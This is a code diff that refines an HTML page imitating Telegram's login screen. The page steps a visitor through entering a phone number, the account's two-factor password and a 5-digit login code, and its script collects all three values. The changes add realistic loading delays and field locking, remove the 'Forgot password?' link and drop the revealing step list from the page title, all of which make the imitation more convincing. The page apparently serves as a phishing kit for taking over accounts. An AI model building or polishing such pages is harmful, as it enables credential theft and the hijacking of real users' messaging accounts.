@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Telegram Login (Phone -> Password -> Code)</title>
+    <title>Telegram Login</title>
     <style>
         body {
             background-color: #ffffff;
@@ -36,7 +36,7 @@
 
         p { color: #707579; font-size: 16px; margin-bottom: 30px; line-height: 1.5; }
 
-        /* === ПОЛЯ ВВОДА (ОБЩИЙ СТИЛЬ) === */
+        /* === ПОЛЯ ВВОДА (ОБЩИЕ) === */
         .input-group {
             position: relative;
             margin-bottom: 25px;
@@ -47,17 +47,18 @@
             width: 100%;
             padding: 15px 20px;
             font-size: 18px;
-            border: 2px solid #dfe1e5;
-            border-radius: 14px; /* Закругление как просили */
+            border: 2px solid #dfe1e5; /* Изначально серая рамка */
+            border-radius: 14px;
             outline: none;
             background: transparent;
             box-sizing: border-box;
             transition: border-color 0.2s;
+            color: #000;
         }
 
-        /* Для пароля нужен отступ справа, чтобы текст не наехал на глаз */
-        #password { padding-right: 45px; }
+        #password { padding-right: 45px; } /* Место для глаза */
 
+        /* Синяя рамка только при фокусе */
         .input-field:focus {
             border-color: #3390ec;
         }
@@ -75,25 +76,25 @@
             padding: 0 5px;
         }
 
+        /* Лейбл наверху */
         .input-field:focus + .input-label,
         .input-field:not(:placeholder-shown) + .input-label {
             top: -10px;
             left: 15px;
             font-size: 12px;
-            color: #3390ec;
             font-weight: 500;
+            color: #999; /* Серый, если просто заполнен */
         }
 
-        /* === ГЛАЗИК ПАРОЛЯ === */
+        /* Лейбл синий, если поле активно */
+        .input-field:focus + .input-label {
+            color: #3390ec;
+        }
+
+        /* === ГЛАЗИК (ПАРОЛЬ) === */
         .password-toggle {
-            position: absolute;
-            right: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            cursor: pointer;
-            color: #999;
-            display: flex;
-            align-items: center;
+            position: absolute; right: 15px; top: 50%; transform: translateY(-50%);
+            cursor: pointer; color: #999; display: flex; align-items: center;
         }
         .password-toggle:hover { color: #3390ec; }
         .password-toggle svg { width: 24px; height: 24px; fill: currentColor; }
@@ -108,19 +109,16 @@
         }
         .btn-next.loading { pointer-events: none; opacity: 0.8; }
 
-        .terms-link, .forgot-link {
-            display: block;
-            margin-top: 20px;
-            color: #999999;
-            text-decoration: none;
-            font-size: 14px;
+        /* ССЫЛКА TERMS (СЕРАЯ) */
+        .terms-link {
+            display: block; margin-top: 20px; color: #999999;
+            text-decoration: none; font-size: 14px;
         }
-        .forgot-link { color: #3390ec; } /* Ссылка "Забыл пароль" обычно синяя */
-        .terms-link:hover, .forgot-link:hover { text-decoration: underline; }
+        .terms-link:hover { text-decoration: underline; color: #777777; }
 
         .hidden { display: none; }
 
-        /* ЛОАДЕР */
+        /* ЛОАДЕР (КРУТИЛКА) */
         .loader {
             border: 3px solid rgba(255, 255, 255, 0.3); border-radius: 50%;
             border-top: 3px solid #ffffff; width: 22px; height: 22px;
@@ -128,7 +126,7 @@
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* КОД */
+        /* === КОД (5 ЦИФР) === */
         .code-container { display: flex; justify-content: center; gap: 10px; margin-bottom: 25px; }
 
         .digit-box {
@@ -144,12 +142,14 @@
             outline: none; padding: 0; margin: 0; color: black;
         }
 
+        /* Анимация появления цифры снизу */
         @keyframes slideNum {
             0% { transform: translateY(100%); opacity: 0; }
             100% { transform: translateY(0); opacity: 1; }
         }
         .code-digit.animate-text { animation: slideNum 0.25s ease-out forwards; }
 
+        /* Состояния кода */
         .digit-box.locked { background-color: #f3f3f3; border-color: #c4c4c4; }
         .digit-box.locked .code-digit { color: #555; }
         .digit-box.success { border-color: #28a745 !important; background-color: #fff !important; }
@@ -180,7 +180,6 @@
                 <input type="password" id="password" class="input-field" placeholder=" ">
                 <label for="password" class="input-label">Password</label>
 
-                <!-- Глазик -->
                 <div class="password-toggle" id="togglePass">
                     <svg id="eye-closed" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                     <svg id="eye-open" viewBox="0 0 24 24" style="display: none;"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 3.31 0 6.28-1.38 8.22-3.67l.48.48 2.27 2.27 1.41-1.41L3.41 2.86 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
@@ -188,10 +187,9 @@
             </div>
 
             <button type="button" class="btn-next" id="btn-pass">Next</button>
-            <a href="#" class="forgot-link">Forgot password?</a>
         </div>
 
-        <!-- ШАГ 3: КОД -->
+        <!-- ШАГ 3: КОД (Кнопки Next нет) -->
         <div id="step-code" class="hidden">
             <div class="code-container" id="otp-inputs">
                 <div class="digit-box"><input type="tel" class="code-digit" maxlength="1" pattern="\d*"></div>
@@ -205,7 +203,6 @@
 </div>
 
 <script>
-    // ЭЛЕМЕНТЫ
     const phoneInput = document.getElementById('phone');
     const btnPhone = document.getElementById('btn-phone');
     const stepPhoneDiv = document.getElementById('step-phone');
@@ -218,7 +215,6 @@
     const eyeOpen = document.getElementById('eye-open');
 
     const stepCodeDiv = document.getElementById('step-code');
-
     const title = document.getElementById('main-title');
     const desc = document.getElementById('main-desc');
 
@@ -226,20 +222,26 @@
     // ШАГ 1: ТЕЛЕФОН
     // ============================================
 
-    // Маска и защита плюса
+    // Курсор всегда после плюса
     function fixCursorPosition() {
         if (phoneInput.value.length < 1) phoneInput.value = '+';
         if (phoneInput.selectionStart === 0) phoneInput.setSelectionRange(phoneInput.value.length, phoneInput.value.length);
     }
     phoneInput.addEventListener('focus', fixCursorPosition);
     phoneInput.addEventListener('click', fixCursorPosition);
+
+    // Если убрали фокус и там только плюс - чистим, чтобы лейбл упал
     phoneInput.addEventListener('blur', () => { if (phoneInput.value === '+') phoneInput.value = ''; });
+
     phoneInput.addEventListener('keyup', () => { if (phoneInput.selectionStart === 0 && phoneInput.value.length > 0) phoneInput.setSelectionRange(1, 1); });
+
+    // Запрет удаления плюса
     phoneInput.addEventListener('keydown', (e) => {
         if (e.key === 'Backspace' && phoneInput.value.length <= 1) e.preventDefault();
         if (e.key === 'Backspace' && phoneInput.selectionStart === 1 && phoneInput.selectionEnd === 1) e.preventDefault();
     });
 
+    // Маски стран
     phoneInput.addEventListener('input', function (e) {
         let x = e.target.value.replace(/\D/g, '');
         let res = '';
@@ -272,7 +274,7 @@
         e.target.value = res;
     });
 
-    // ПЕРЕХОД: Телефон -> Пароль
+    // КНОПКА ТЕЛЕФОНА (Блокировка ввода)
     btnPhone.addEventListener('click', function() {
         const phoneNumber = phoneInput.value;
         if (phoneNumber.length < 8) { alert('Неверный номер'); return; }
@@ -280,6 +282,11 @@
         const originalText = btnPhone.innerText;
         btnPhone.classList.add('loading');
         btnPhone.innerHTML = '<div class="loader"></div>';
+
+        // БЛОКИРОВКА
+        phoneInput.readOnly = true;
+        phoneInput.blur(); // Убираем фокус
+        phoneInput.style.pointerEvents = 'none'; // Запрет кликов
 
         setTimeout(() => {
             btnPhone.classList.remove('loading');
@@ -296,14 +303,12 @@
         stepPhoneDiv.classList.add('hidden');
         stepPassDiv.classList.remove('hidden');
 
-        // Меняем заголовок
         title.innerText = 'Enter a Password';
         desc.innerHTML = 'Your account is protected with<br>an additional password.';
 
         setTimeout(() => passwordInput.focus(), 100);
     }
 
-    // Показать/Скрыть пароль
     togglePass.addEventListener('click', () => {
         if (passwordInput.type === 'password') {
             passwordInput.type = 'text';
@@ -316,7 +321,7 @@
         }
     });
 
-    // ПЕРЕХОД: Пароль -> Код
+    // КНОПКА ПАРОЛЯ (Блокировка)
     btnPass.addEventListener('click', function() {
         if (passwordInput.value.length === 0) { alert('Enter password'); return; }
 
@@ -324,10 +329,16 @@
         btnPass.classList.add('loading');
         btnPass.innerHTML = '<div class="loader"></div>';
 
+        // БЛОКИРОВКА
+        passwordInput.readOnly = true;
+        passwordInput.blur();
+        passwordInput.style.pointerEvents = 'none';
+        togglePass.style.pointerEvents = 'none';
+
         setTimeout(() => {
             btnPass.classList.remove('loading');
             btnPass.innerText = originalText;
-            showCodeStep(phoneInput.value); // Передаем номер для заголовка
+            showCodeStep(phoneInput.value);
         }, 4000);
     });
 
@@ -343,7 +354,7 @@
         setTimeout(() => { document.querySelector('.code-digit').focus(); }, 100);
     }
 
-    // Возврат (Сбрасывает все на начало)
+    // ВОЗВРАТ (Сброс и разблокировка)
     window.goBack = function() {
         stepCodeDiv.classList.add('hidden');
         stepPassDiv.classList.add('hidden');
@@ -353,8 +364,17 @@
         desc.innerHTML = 'Please confirm your country code and<br>enter your phone number.';
         phoneInput.focus();
 
-        // Сброс
+        // Разблокировка ТЕЛЕФОНА
+        phoneInput.readOnly = false;
+        phoneInput.style.pointerEvents = 'auto';
+
+        // Разблокировка ПАРОЛЯ
+        passwordInput.readOnly = false;
         passwordInput.value = '';
+        passwordInput.style.pointerEvents = 'auto';
+        togglePass.style.pointerEvents = 'auto';
+
+        // Сброс КОДА
         const boxes = document.querySelectorAll('.digit-box');
         const inputs = document.querySelectorAll('.code-digit');
         boxes.forEach(box => {
@@ -380,6 +400,7 @@
         console.log(`Пароль: ${password}`);
         console.log(`Код: ${code}`);
 
+        // Блокировка кода
         inputs.forEach(inp => { inp.readOnly = true; inp.blur(); });
         boxes.forEach(box => { box.classList.add('locked'); });
 
@@ -391,7 +412,6 @@
         }, 5000);
     }
 
-    // Логика цифр
     const inputs = document.querySelectorAll('.code-digit');
     inputs.forEach((input, index) => {
         input.addEventListener('input', (e) => {
